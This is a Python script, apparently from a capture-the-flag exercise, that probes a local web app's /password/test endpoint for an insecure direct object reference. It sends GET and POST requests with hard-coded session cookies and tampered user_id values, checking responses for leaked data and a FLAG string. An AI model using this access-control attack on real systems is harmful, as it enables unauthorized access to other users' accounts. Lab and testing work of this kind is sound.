import requests
import re

# Base URL - using the endpoint mentioned in context
base_url = "http://127.0.0.1"
endpoint = "/password/test"

# Cookies from context
cookies = {
    'auth_token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QiLCJ1c2VyX2lkIjoxMDAzMiwidXNlcl90eXBlIjoiY3VzdG9tZXIifQ.ubKxvL3U9FouYhgqbsNNfV7C6iaVCJ83foZ1bq8roEs',
    'session': 'eyJ1c2VyX2lkIjoxMDAzMn0.aVWMEQ.ysLVLWZ3r1aYnccVIPMb7n4vSNE'
}

# Step 1: GET request to see the form and understand the parameter structure
print("=" * 80)
print("[STEP 1] GET request to /password/test to examine form structure")
print("=" * 80)

try:
    response = requests.get(base_url + endpoint, cookies=cookies, timeout=10)
    print(f"Status Code: {response.status_code}")
    print(f"Content Length: {len(response.text)} bytes")
    print("\n[Full Response:]")
    print(response.text)
    
    # Look for form fields
    print("\n" + "=" * 80)
    print("[Form Analysis]")
    print("=" * 80)
    
    # Extract hidden form fields
    hidden_fields = re.findall(r'<input[^>]*type=["\']?hidden["\']?[^>]*>', response.text, re.IGNORECASE)
    if hidden_fields:
        print("Found hidden form fields:")
        for field in hidden_fields:
            print(f"  {field}")
    
    # Extract any form action
    form_action = re.search(r'<form[^>]*action=["\']?([^"\'\s]+)["\']?[^>]*>', response.text, re.IGNORECASE)
    if form_action:
        print(f"\nForm action: {form_action.group(1)}")
    
    # Check for user_id in the response
    user_id_matches = re.findall(r'user_id[^\w\d]*([\w\d]+)', response.text, re.IGNORECASE)
    if user_id_matches:
        print(f"\nFound user_id references: {user_id_matches}")
    
    # Check for username in the response
    username_matches = re.findall(r'username[^\w\d]*([\w\d]+)', response.text, re.IGNORECASE)
    if username_matches:
        print(f"Found username references: {username_matches}")
        
except Exception as e:
    print(f"Error during GET request: {e}")

# Step 2: Test if user_id can be manipulated via query parameter
print("\n" + "=" * 80)
print("[STEP 2] Testing user_id manipulation via query parameter")
print("=" * 80)

# Test with different user_id values
test_user_ids = ["10031", "10033", "1", "99999", "10032"]  # Including baseline

for user_id in test_user_ids:
    try:
        test_endpoint = f"{base_url}{endpoint}?user_id={user_id}"
        print(f"\nTesting: {test_endpoint}")
        response = requests.get(test_endpoint, cookies=cookies, timeout=10)
        print(f"  Status: {response.status_code}")
        print(f"  Length: {len(response.text)} bytes")
        
        # Check if response is different from baseline
        if user_id == "10032":
            baseline_length = len(response.text)
            print(f"  Baseline length: {baseline_length}")
        else:
            if len(response.text) != baseline_length:
                print(f"  [!] Different response length - potential data leak!")
                # Check for flag in response
                flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                if flag_match:
                    print(f"  [!] FLAG FOUND: {flag_match.group(0)}")
                print(f"  Response preview: {response.text[:200]}...")
            else:
                print(f"  No significant difference")
                
    except Exception as e:
        print(f"  Error: {e}")

# Step 3: If query parameter doesn't work, try POST with form data
print("\n" + "=" * 80)
print("[STEP 3] Testing POST request with manipulated user_id")
print("=" * 80)

# First, let's try to find the actual form parameters by looking at the HTML more carefully
try:
    response = requests.get(base_url + endpoint, cookies=cookies, timeout=10)
    
    # Find all input fields
    input_fields = re.findall(r'<input([^>]*)>', response.text, re.IGNORECASE)
    form_data = {}
    
    print("Extracting form fields:")
    for field in input_fields:
        # Extract name and value
        name_match = re.search(r'name=["\']?([^"\'\s]+)["\']?', field, re.IGNORECASE)
        value_match = re.search(r'value=["\']?([^"\'\s]*)["\']?', field, re.IGNORECASE)
        
        if name_match:
            name = name_match.group(1)
            value = value_match.group(1) if value_match else ""
            form_data[name] = value
            print(f"  {name}: {value}")
    
    # Try posting with modified user_id
    if form_data:
        print(f"\nOriginal form data: {form_data}")
        
        # Modify user_id to test for horizontal privilege escalation
        for test_id in ["10031", "10033", "1", "99999"]:
            modified_data = form_data.copy()
            if 'user_id' in modified_data:
                modified_data['user_id'] = test_id
            
            try:
                print(f"\nTesting POST with user_id={test_id}")
                response = requests.post(base_url + endpoint, cookies=cookies, data=modified_data, timeout=10)
                print(f"  Status: {response.status_code}")
                print(f"  Length: {len(response.text)} bytes")
                
                # Check for differences
                if len(response.text) != baseline_length:
                    print(f"  [!] Response differs from baseline!")
                    flag_match = re.search(r'FLAG\{[^}]+\}', response.text)
                    if flag_match:
                        print(f"  [!] FLAG FOUND: {flag_match.group(0)}")
                    print(f"  Response preview: {response.text[:300]}...")
                else:
                    print(f"  No significant difference")
                    
            except Exception as e:
                print(f"  Error: {e}")
    else:
        print("No form fields found")
        
except Exception as e:
    print(f"Error during form analysis: {e}")
